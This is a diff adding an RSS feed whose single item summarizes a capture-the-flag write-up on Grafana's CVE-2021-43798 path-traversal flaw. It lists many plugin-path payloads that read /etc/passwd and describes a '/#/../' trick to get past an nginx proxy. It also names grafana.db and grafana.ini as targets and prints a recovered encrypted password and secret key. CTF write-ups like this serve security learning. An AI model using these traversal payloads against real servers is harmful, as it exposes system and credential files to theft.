@@ -1,0 +1,25 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Grafana - Tag - ThnPinkman’s blog</title>
+        <link>https://thnpkm.github.io/tags/grafana/</link>
+        <description>Grafana - Tag - ThnPinkman’s blog</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/tags/grafana/" rel="self" type="application/rss+xml" /><item>
+    <title>字节CTF </title>
+    <link>https://thnpkm.github.io/posts/ctf/%E5%AD%97%E8%8A%82ctf/</link>
+    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/ctf/%E5%AD%97%E8%8A%82ctf/</guid>
+    <description><![CDATA[字节ctf easy_grafana 去网上搜grafana比较近的漏洞 全是CVE-2021-43798：Grafana任意文件读取漏洞
+https://cloud.tencent.com/developer/article/1973276提供了很多payload
+/public/plugins/alertGroups/../../../../../../../../etc/passwd/public/plugins/alertlist/../../../../../../../../etc/passwd/public/plugins/annolist/../../../../../../../../etc/passwd/public/plugins/barchart/../../../../../../../../etc/passwd/public/plugins/bargauge/../../../../../../../../etc/passwd/public/plugins/canvas/../../../../../../../../etc/passwd/public/plugins/dashlist/../../../../../../../../etc/passwd/public/plugins/debug/../../../../../../../../etc/passwd/public/plugins/gauge/../../../../../../../../etc/passwd/public/plugins/geomap/../../../../../../../../etc/passwd/public/plugins/gettingstarted/../../../../../../../../etc/passwd/public/plugins/graph/../../../../../../../../etc/passwd/public/plugins/heatmap/../../../../../../../../etc/passwd/public/plugins/histogram/../../../../../../../../etc/passwd/public/plugins/live/../../../../../../../../etc/passwd/public/plugins/logs/../../../../../../../../etc/passwd/public/plugins/news/../../../../../../../../etc/passwd/public/plugins/nodeGraph/../../../../../../../../etc/passwd/public/plugins/piechart/../../../../../../../../etc/passwd/public/plugins/pluginlist/../../../../../../../../etc/passwd/public/plugins/stat/../../../../../../../../etc/passwd/public/plugins/state-timeline/../../../../../../../../etc/passwd/public/plugins/status-history/../../../../../../../../etc/passwd/public/plugins/table/../../../../../../../../etc/passwd/public/plugins/table-old/../../../../../../../../etc/passwd/public/plugins/text/../../../../../../../../etc/passwd/public/plugins/timeseries/../../../../../../../../etc/passwd/public/plugins/welcome/../../../../../../../../etc/passwd/public/plugins/xychart/../../../../../../../../etc/passwd 但是无一例外 都出现了400错误
+但是原因不清楚，了解到是nginx反向代理的问题
+参考这篇文章
+https://www.cnblogs.com/sevck/p/15660592.html在payload里面加入这个即可
+/#/../ 漏洞利用：
+https://github.com/jas502n/Grafana-CVE-2021-43798获取数据库密码
+/var/lib/grafana/grafana.db
+{&#34;password&#34;:&#34;b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/&#34;} 配置/etc/grafana/grafana.ini
+secret_key = SW2YcwTIb9zpO1hoPsMm 拿github的工具解密需要go环境]]></description>
+</item>
+</channel>
+</rss>
